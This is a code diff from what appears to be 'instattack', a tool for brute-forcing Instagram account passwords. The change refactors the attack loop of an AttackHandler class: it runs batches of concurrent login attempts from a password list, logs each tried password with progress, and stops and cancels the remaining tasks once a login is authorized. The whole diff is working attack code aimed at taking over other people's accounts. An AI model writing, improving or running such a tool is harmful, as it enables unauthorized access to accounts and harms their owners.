@@ -3,7 +3,7 @@ import aiohttp
 
 from instattack.config import config
 from instattack.lib import logger
-from instattack.lib.utils import percentage, limit_as_completed
+from instattack.lib.utils import percentage, limit_as_completed, cancel_remaining_tasks
 
 from instattack.app.exceptions import NoPasswordsError
 from instattack.app.models import InstagramResults
@@ -126,42 +126,43 @@ class AttackHandler(AbstractLoginHandler):
         """
         cookies = await self.cookies()
         await self.start_event.wait()
+        results = InstagramResults(results=[])
+
+        def done_callback(fut, pending, num_tries):
+            if fut.exception():
+                return True
+
+            result, num_attempts = fut.result()
+            if result.conclusive:
+                self.num_completed += 1
+                results.add(result)
+
+                pct = percentage(self.num_completed, self.num_passwords)
+                log.info(f'{pct}', extra={
+                    'other': f'Num Attempts: {num_attempts}',
+                    'password': result.password,
+                })
+                if result.authorized:
+                    self.stop_event.set()
+                    asyncio.create_task(cancel_remaining_tasks(futures=pending))
 
         async with aiohttp.ClientSession(
             connector=self.connector,
             cookies=cookies,
             timeout=self.timeout,
         ) as session:
-
-            results = InstagramResults(results=[])
-
-            async for fut in limit_as_completed(
+            async for fut, pending, num_tries in limit_as_completed(
                 coros=self.generate_attempts_for_passwords(session),
                 batch_size=config['passwords']['batch_size'],
-                stop_event=self.stop_event,
+                done_callback=done_callback,
+                stop_event=self.stop_event
             ):
                 if fut.exception():
                     raise fut.exception()
 
-                result, num_tries = fut.result()
-
+                result, num_attempts = fut.result()
                 if result.conclusive:
-                    self.num_completed += 1
-                    results.add(result)
-
-                    pct = percentage(self.num_completed, self.num_passwords)
-                    log.info(f'{pct}', extra={
-                        'other': f'Num Attempts: {num_tries}',
-                        'password': result.password,
-                    })
                     await self.handle_attempt(result)
-
-                    # TODO: This Causes asyncio.CancelledError
-                    # await cancel_remaining_tasks(futures=current_tasks)
-
-                    if result.authorized:
-                        self.stop_event.set()
-                        break
 
         await asyncio.sleep(0)
         return results
